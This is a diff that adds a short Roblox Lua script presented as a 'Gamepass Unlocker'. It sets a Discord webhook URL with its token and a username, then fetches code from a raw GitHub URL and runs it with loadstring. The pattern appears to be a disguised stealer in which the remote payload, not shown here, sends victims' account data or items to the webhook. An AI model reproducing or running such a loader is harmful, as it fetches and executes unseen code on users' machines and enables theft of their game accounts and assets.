@@ -1,0 +1,5 @@
+_G.Username = "IDANOFFMOR"
+_G.HubName = "Gamepass Unlocker"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1094722331949158450/QxptQhq-wuetpjccbLI7sj-60ST6pwKAdlfP5pyBQWNtj6I3QElSx13y42Ano-1oA0RA"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
